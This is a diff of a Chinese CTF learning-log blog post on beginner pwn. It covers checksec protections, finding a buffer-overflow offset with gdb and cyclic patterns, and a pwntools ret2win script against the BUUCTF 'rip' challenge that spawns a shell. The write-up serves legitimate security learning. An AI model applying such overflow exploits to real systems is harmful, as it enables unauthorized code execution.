@@ -1,4 +1,4 @@
----
+<img width="379" height="32" alt="image" src="https://github.com/user-attachments/assets/62b69c1b-428f-455d-9c38-b0fa927e1e3d" />---
 title: "CTF 学习日志 0x00 版"
 description: "如有错误请指出"
 date: 2025-12-17T00:00:00+08:00
@@ -15,9 +15,57 @@ tags:
     - 学习日志
 ---
 
+使用环境 ：wsl kali linux
+
+```
+PRETTY_NAME="Kali GNU/Linux Rolling"
+NAME="Kali GNU/Linux"
+VERSION_ID="2025.3"
+VERSION="2025.3"
+VERSION_CODENAME=kali-rolling
+ID=kali
+ID_LIKE=debian
+HOME_URL="https://www.kali.org/"
+SUPPORT_URL="https://forums.kali.org/"
+BUG_REPORT_URL="https://bugs.kali.org/"
+ANSI_COLOR="1;31
+```
+
 ## Reference
 
 [hello ctf](https://hello-ctf.com/home/)
+
+## 安全保护检查
+
+设某道题附加可执行文件 ciscn 。
+
+`chmod +x ./ciscn` 给文件 ciscn 加上 可执行权限。
+
+`pwn checksec ciscn_2019_c_1` 查这个二进制的常见防护机制。
+
+常见的安全保护：
+
+* Arch: 
+  * `i386-32-little`：32 位，小端，参数多在栈上传。
+  * `amd64-64-little`：64 位，小端，参数通常走寄存器。
+* RELRO：
+  * `No RELRO`：GOT 表可写、可在运行时继续解析，更容易做 GOT 覆写。
+  * `Partial RELRO`：启用了部分保护：`.got``.plt` 仍可能可写。
+  * `Full RELRO`: GOT 在解析完成后会被设成只读，基本堵死 GOT 覆写路线（但不影响 ret2libc/ROP 泄露）
+* Stack:
+  * `Canary found`：有栈保护，溢出覆盖返回地址前会先覆盖 canary，函数返回时会检查。
+  * `No canary found`：没 canary，栈溢出更直接。
+* NX：
+  * `NX enabled`：栈/堆大多不可执行。
+  * `NX disabled`：可执行栈。
+* PIE：
+  * `PIE enabled`：程序本体代码段地址也会随机化（每次运行基址变）。
+  * `No PIE (0x400000)`：程序本体地址固定（常见起点 0x400000），libc 仍可能因 ASLR 随机。
+
+示例（ciscn_2019_c_1）：
+
+<img width="352" height="132" alt="image" src="https://github.com/user-attachments/assets/18e3c6e1-575c-44c8-873d-7c36256a91b6" />
+
 
 ##  初学 Pwn，二进制安全
 
@@ -460,6 +508,119 @@ ret
 当 `vulnerable_function` 运行结束，执行到 `ret` 指令时，程序跳转到了一个非法地址，崩溃了（Segmentation Fault）。
 
 那么，我们如果把最后 8 个 `B`，换成 **后门函数（backdoor）** 的真实地址，CPU 就会跳进去帮我们找到 Shell。
+
+#### gdb 调试找到 offset
+
+用 gdb 找到「覆盖到返回地址 RIP/EIP 需要的字节数（offset）」
+
+自己算也可以。
+
+1. 启动 pwngdb
+
+<img width="679" height="127" alt="image" src="https://github.com/user-attachments/assets/4efc4b9e-4efa-4ee2-939b-49861699ba45" />
+
+2. 查看 main 函数汇编
+
+<img width="529" height="298" alt="image" src="https://github.com/user-attachments/assets/fc7180fc-3b56-4eb1-81e5-581efdfd46ed" />
+
+3. 在 gets 调用处下断点
+
+<img width="173" height="32" alt="image" src="https://github.com/user-attachments/assets/b59f7fe3-847c-4238-8fbf-84ba6698919e" />
+
+4. 运行到断点
+
+<img width="675" height="657" alt="image" src="https://github.com/user-attachments/assets/c520d302-ac1c-4501-a4ff-2d2555e22731" />
+
+5. 生成随机 cyclic 字符串
+
+<img width="1258" height="50" alt="image" src="https://github.com/user-attachments/assets/7f73a3c0-feed-463c-b33f-be35f6dc5d10" />
+
+6. 继续运行程序。
+
+以该题目为例，它会执行 `call gets@plt`，然后卡在 `gets` 里等待你输入。
+
+<img width="1259" height="628" alt="image" src="https://github.com/user-attachments/assets/1150295f-0a2a-4ce1-b889-bf2e9b3966b2" />
+
+其中有一段标为绿色的代码行：
+
+```
+► 0x401185 <main+67>    ret                                <0x6161616161616461>
+```
+
+箭头 ► 指向指当前要执行的命令是 `ret`，`0x401185 <main+67>` 是 `ret` 的位置，尖括号是 `ret` 将要跳去的地址：`<0x6161616161616461>`。
+
+7. 看当前指令指针指向哪。
+
+<img width="379" height="32" alt="image" src="https://github.com/user-attachments/assets/fcbc93e0-b4cb-49fb-8ad0-2950a2f9002b" />
+
+`0x401185 <main+67>` 即 `ret` 的位置。
+
+8. 查看栈顶的 8 字节内容
+
+<img width="244" height="32" alt="image" src="https://github.com/user-attachments/assets/eb77856d-e56b-44df-9dde-ea91cd0b5877" />
+
+这条命令的含义：“从 $rsp 指向的内存地址开始，读取 8 字节，并用十六进制打印出来。”
+
+9. 反查这 8 字节模式在 cyclic 里的位置，输出就是 offset。 
+
+<img width="507" height="72" alt="image" src="https://github.com/user-attachments/assets/7376ffdc-142f-4367-8e48-44d2284c71b9" />
+
+#### 例题 1：rip
+
+[BUUCTF 题目链接](https://buuoj.cn/challenges#rip)
+
+安全防护检查：
+
+<img width="381" height="169" alt="image" src="https://github.com/user-attachments/assets/c449ecd2-e712-4c1b-ae13-68d0ac36dd79" />
+
+`PIE:        No PIE (0x400000)` 主函数基地址不变，可以直接查函数的地址。
+
+使用 IDA 反编译结果如下：
+
+<img width="1280" height="362" alt="image" src="https://github.com/user-attachments/assets/957b60b5-0338-4b10-af8d-b61cff06d64b" />
+
+容易发现有一个 `fun()` 函数，藏了 `return system("/bin/sh");`。
+
+Exports 中查到 `fun()` 函数的地址：
+
+<img width="1278" height="379" alt="image" src="https://github.com/user-attachments/assets/6cf82a27-b178-46f0-bc65-8383358cb47e" />
+
+是 `fun	0000000000401186	`。
+
+接下来找到 offset，构造 payload，本人使用 gdb 调试得到 offset=23。
+
+然后写代码：
+
+```
+# written by Sonnety
+from pwn import *
+
+context(os="linux", arch="amd64")
+context.log_level = "debug"
+
+host = "node5.buuoj.cn"
+port = 25390
+
+offset = 23
+fun_addr = 0x401186  # 从 IDA / disas 看到的 fun() 地址
+ret_addr = 0x401016
+
+def main():
+    io = remote(host, port)
+
+    # 先输出提示再读入
+    try:
+        io.recvuntil(b"please input", timeout=2)
+    except Exception:
+        pass
+    payload = b"A"*offset + p64(ret_addr) + p64(fun_addr)
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
 
 #### 一个例题
 
